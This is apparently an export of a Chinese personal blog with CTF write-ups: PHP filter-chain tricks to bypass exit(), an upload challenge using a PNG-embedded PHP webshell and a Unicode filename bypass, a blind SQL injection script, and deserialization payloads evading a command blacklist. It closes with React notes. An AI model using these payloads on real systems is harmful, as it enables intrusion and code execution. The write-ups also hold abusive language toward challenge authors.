<p><code>convert.base64-encode</code>和 <code>convert.base64-decode</code>使用这两个过滤器等同于分别用 <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>和 <a href="https://www.php.net/manual/zh/function.base64-decode.php">base64_decode()</a>函数处理所有的流数据。 <code>convert.base64-encode</code>支持以一个关联数组给出的参数。如果给出了 <code>line-length</code>，base64 输出将被用 <code>line-length</code>个字符为 长度而截成块。如果给出了 <code>line-break-chars</code>，每块将被用给出的字符隔开。这些参数的效果和用 <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>再加上 <a href="https://www.php.net/manual/zh/function.chunk-split.php">chunk_split()</a>相同。</p>
<h3 id="convert-base64-encode-decode"><a href="#convert-base64-encode-decode" class="headerlink" title="convert.base64-encode/decode"></a>convert.base64-encode/decode</h3><p>这个大家都很熟了就不多说了。</p>
<h3 id="convert-quoted-printable-encode-amp-convert-quoted-printable-decode"><a href="#convert-quoted-printable-encode-amp-convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-encode &amp; convert.quoted-printable-decode"></a>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</h3><p>官方的解释：</p>
<p><code>convert.quoted-printable-encode</code>和 <code>convert.quoted-printable-decode</code>使用此过滤器的 decode 版本等同于用 <a href="https://www.php.net/manual/zh/function.quoted-printable-decode.php">quoted_printable_decode()</a>函数处理所有的流数据。没有和 <code>convert.quoted-printable-encode</code>相对应的函数。 <code>convert.quoted-printable-encode</code>支持以一个关联数组给出的参数。除了支持和 <code>convert.base64-encode</code>一样的附加参数外， <code>convert.quoted-printable-encode</code>还支持布尔参数 <code>binary</code>和 <code>force-encode-first</code>。 <code>convert.base64-decode</code>只支持 <code>line-break-chars</code>参数作为从编码载荷中剥离的类型提示。</p>
<p>感觉好复杂。。但是主要是第二行，等价于quoted_printable_decode函数，该函数的作将 quoted-printable 字符串转换为 8-bit 字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  =This is a test.=0A  */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>欸，这就很迷惑了，啥几把是8-bit 字符串？</p>
<p>官方丢了个url给我：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.faqs.org&#x2F;rfcs&#x2F;rfc2045.html</span><br></pre></td></tr></table></figure>

<p>欸，这就很难过了，我看不懂该咋办啊？，但是感觉对于做题来说有点鸡肋，暂时先知识放在这里（希望不要哪天别人悟了出题做不出来挨打呜呜）</p>
<h3 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h3><p>呃。这个过滤器是被官方藏起来了，只有英文的原版手册才可以看见（怪不得见有题目出过）</p>
<p>该<code>convert.iconv.*</code>过滤器是可用的，如果 <a href="https://www.php.net/manual/en/book.iconv.php">的iconv</a>支持启用，并且它们的使用是等同于处理所有的流数据<a href="https://www.php.net/manual/en/function.iconv.php">的iconv（） </a>。这些过滤器不支持参数，而是期望输入和输出编码作为过滤器名称的一部分给出，即as <code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code>或 <code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code> （这两个符号在语义上是等效的）。</p>
<p>用法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">/* Outputs: This is a test. */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>欸，有这个就很方便，它允许我们将将内容从A-&gt;转换到B，这样的话就很舒服，因为他会造成题目设置的障碍代码失效，比如有这种情况：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php exit(); /* 可控内容  */ \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>构造url如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>

<p>得到结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ADw?php exit()+ADs </span><br></pre></td></tr></table></figure>

<p>欸，这时候就有人可能要问了，可是我也不懂utf-7啊？其实这也很简单，不懂没事，在本机上先将想要的内容操作一下就好了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php phpinfo(); \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+ADw?php phpinfo()+ADs </span><br></pre></td></tr></table></figure>

<p>欸，这是又遇见了一个问题，这个流好像只能加密，没办法解密啊，这样导致了一个很尴尬的问题，如果我们尝试输入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php exit(); +ADw?php phpinfo()+ADs \n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>被转换之后的结果并非我们所设想的转换回去，而是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+ADw?php <span class="keyword">exit</span>()+ADs +-ADw?php phpinfo()+-ADs </span><br></pre></td></tr></table></figure>

<p>但是这依然不失为一种是将死亡exit删掉的好方法，我们可以同样的利用base64流等等操作把他转换一哈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;1.php</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line">$fp = fopen($a, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp, <span class="string">&quot;&lt;?php exit();aCjw/cGhwIHBocGluZm8oKTs= \n&quot;</span>);</span><br><span class="line"><span class="comment">// 这里的a就是用于填充8字节的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个提供各种字节编码的网站：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.compart.com&#x2F;en&#x2F;unicode&#x2F;</span><br></pre></td></tr></table></figure>



<p>突然又看到这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;KSroido&#x2F;article&#x2F;details&#x2F;109656236</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;USTC-Hackergame&#x2F;hackergame2020-writeups</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCNUPLOAD</title>
    <url>/2021/05/19/CISCNUPLOAD/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
<li>upload</li>
<li>字符串编码问题</li>
<li>代码审计（？大概也没有）</li>
<li>mb_strtolower 绕过</li>
</ul>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目一共给出index.php 和example.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这么大个的东西你是想d我吗？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imageinfo = getimagesize($_FILES[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; $imageinfo[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $fileName=urldecode($_FILES[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr($fileName,<span class="string">&quot;c&quot;</span>) || stristr($fileName,<span class="string">&quot;i&quot;</span>) || stristr($fileName,<span class="string">&quot;h&quot;</span>) || stristr($fileName,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imagePath = <span class="string">&quot;image/&quot;</span> . mb_strtolower($fileName);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $imagePath)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;传都没有传上去&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>要求上传一个正方形的图片，且图片后缀不可以有c/i/ph/h</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    $name_for_zip = <span class="string">&quot;example/&quot;</span> . $_POST[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,$name_for_zip)[count(explode(<span class="string">&quot;.&quot;</span>,$name_for_zip))<span class="number">-1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;要不咱们再看看？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;都不能解压呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;可以解压，我想想存哪里&quot;</span>;</span><br><span class="line">    $pos_for_zip = <span class="string">&quot;/tmp/example/&quot;</span> . md5($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    $zip-&gt;extractTo($pos_for_zip);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    unlink($name_for_zip);</span><br><span class="line">    $files = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir($file)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $first = imagecreatefrompng($file);</span><br><span class="line">        $size = min(imagesx($first), imagesy($first));</span><br><span class="line">        $second = imagecrop($first, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; $size, <span class="string">&#x27;height&#x27;</span> =&gt; $size]);</span><br><span class="line">        <span class="keyword">if</span> ($second !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            $final_name = pathinfo($file)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng($second, <span class="string">&#x27;example/&#x27;</span>.$final_name);</span><br><span class="line">            imagedestroy($second);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy($first);</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>题目的代码很简单看懂，就是允许上传zip，然后将zip解压出来，check剪出来的时候是图片，如果是图片就重新生成裁剪之后放到example目录下，然后删除原图片。</p>
<p>大概思路就是上传一个zip，然后将zip解压之后要求是一个具有图片属性的PHP，解压getshell</p>
<p>需要用脚本把shell插入到图片中间并且不会损坏图片，下面这个脚本可以做到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0xe</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>, <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>, <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"> </span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">$r = $p[$y];</span><br><span class="line">$g = $p[$y+<span class="number">1</span>];</span><br><span class="line">$b = $p[$y+<span class="number">2</span>];</span><br><span class="line">$color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">imagepng($img,<span class="string">&quot;ciscn.php&quot;</span>);</span><br><span class="line"><span class="comment">//<span class="meta">&lt;?=</span>$_GET[0]($_POST[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>将php压缩即可</p>
<p>至于mb_strtolower 绕过，可以通过某些特殊符号绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP :: Request #70072 :: Add a language avare uppercase&#x2F;lowercase solution without need of locale change</span><br></pre></td></tr></table></figure>

<p>上传时使用<code>xxx.zİp</code>，经过<code>mb_strtolower</code>后存到服务器的文件名变为<code>xxx.zip</code></p>
<p>注意踩坑： 这里你需要在文件名的时候修改，形如：</p>
<p><img src="CISCNUPLOAD/image-20210519210500240.png" alt="image-20210519210500240"></p>
<p>然后直接上传就可以成功，如果在burp抓包的时候改会失败（w4,超人超人超人）</p>
<p>关于如何修改ZIP，你需要先找一个正常的png，能上传的PNG，然后</p>
<p><img src="image-20210519210649470.png" alt="image-20210519210649470"></p>
<p>第二行第八列之前的part复制下来，直接修改zip的前面</p>
<p><img src="image-20210519210710340.png" alt="image-20210519210710340"></p>
<p>抓包上传</p>
<p><img src="image-20210519210720706.png" alt="image-20210519210720706"></p>
<p>🛫</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>美团CTF两个</title>
    <url>/2021/05/23/%E7%BE%8E%E5%9B%A2CTF%E4%B8%A4%E4%B8%AA/</url>
    <content><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>这题没什么好说的</p>
<p>sql注入，布尔盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze15odoih1f3qlkwjtb.cloudeci1.ichunqiu.com/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">goodflag =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">94</span> <span class="keyword">or</span> j == <span class="number">46</span> <span class="keyword">or</span> j == <span class="number">42</span> <span class="keyword">or</span> j == <span class="number">43</span> <span class="keyword">or</span> j == <span class="number">63</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        j = <span class="built_in">chr</span>(j).encode()</span><br><span class="line">        j = binascii.hexlify(j)</span><br><span class="line">        j = j.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># hex2bin</span></span><br><span class="line">        data = &#123;<span class="string">&quot;password&quot;</span>: <span class="string">&quot;||left(password,&#123;&#125;)regexp(binary(0x&#123;&#125;))#&quot;</span>.<span class="built_in">format</span>(i, flag + j)</span><br><span class="line">            , <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            goodflag = binascii.unhexlify(flag).decode()</span><br><span class="line">            print(goodflag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;7d&#x27;</span>:</span><br><span class="line">            exit(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># database CTF</span></span><br><span class="line"><span class="comment"># user root</span></span><br><span class="line"><span class="comment"># version 5.x?</span></span><br></pre></td></tr></table></figure>



<p>注入得到密码This_1s_thE_Passw0rd，登陆得到flag</p>
<h1 id="easytricks"><a href="#easytricks" class="headerlink" title="easytricks"></a>easytricks</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>条件竞争</p>
<p>反序列化写入</p>
<p>真的脑瘫，我没见过这样子出题的，正常的网站功能用安恒四月赛的web2来出，然后你麻痹的没有用，你这网站功能没用你写你麻痹，你就一个php有用NTM能不能直接给出来啊，脑残？</p>
<p><img src="image-20210523215019646.png" alt="image-20210523215019646"></p>
<p>真的搞笑，这其他的PHP全是没有任何一点一一，然后放在admin.rar 里面，比谁目录工具牛逼？真几把死了吗的人才出得来这种题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&#x27;session&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents=<span class="string">&quot;new hacker();&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">        $blacklist=<span class="string">&quot;/flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|\.|\\\|#|\\$|[0-9]|_|get|~|\\^|eval|assert|open|write|include|require/is&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match($blacklist,$parm);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;contents)||strlen(<span class="keyword">$this</span>-&gt;contents)&gt;<span class="number">60</span>||preg_match_all(<span class="string">&#x27;/\\(/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,$matches)&gt;<span class="number">2</span>||preg_match_all(<span class="string">&#x27;/\\)/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,$matches)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span class="string">&#x27;/;/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,$matches)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;try hard&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>))&#123;</span><br><span class="line">            unlink(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;class);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;contents,FILE_APPEND);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;method,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=$_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line">$preload=<span class="keyword">new</span> preload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;./hack.php&quot;</span>&gt;hack.php&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./cli.php&quot;</span>&gt;cli.php&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<p>代码可以审计，发现我们可以控制写入的内容，内容虽然过来的很严格，大概规则如下：</p>
<ul>
<li>两个左括号，两个右括号</li>
<li>一个分号</li>
<li>flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|.|\|#|\$|[0-9]|_|get|~|\^|eval|assert|open|write|include|require/is 过滤</li>
</ul>
<p>然后依然可以写入- -</p>
<p><img src="image-20210523215943106.png" alt="image-20210523215943106"></p>
<p>写入的姿势有两个：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$preload=<span class="keyword">new</span> preload();</span><br><span class="line">$preload-&gt;contents=<span class="string">&quot;strrev(&#x27;metsys&#x27;)(&#x27;cat /fla*&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>或者说：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$preload=<span class="keyword">new</span> preload();</span><br><span class="line">$preload-&gt;contents=<span class="string">&quot;strtr(&#x27;systed&#x27;,&#x27;ed&#x27;,&#x27;em&#x27;)(&#x27;cat /fla*&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>React一些学习</title>
    <url>/2021/05/30/React%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>说实话明年我真的不想做前端了，又累还要被吐槽简单。</p>
<p>这次自己的前端用到的技术栈还好，</p>
<p>路由管理： umi</p>
<p>前端展示： antd</p>
<p>记录一下自己遇见的知识：</p>
<p>我觉得最主要的就是hook，如何使用好hook是很重要的。说几个自己常用的：</p>
<h1 id="useState"><a href="#useState" class="headerlink" title="useState"></a>useState</h1><p>常见形式：</p>
<p><strong>const [data, setData] = useState([]);</strong></p>
<p>这个可太好用了，意思是定义了data，并直接定义了一个set方法，并且规定了State的返回期待为一个数组。</p>
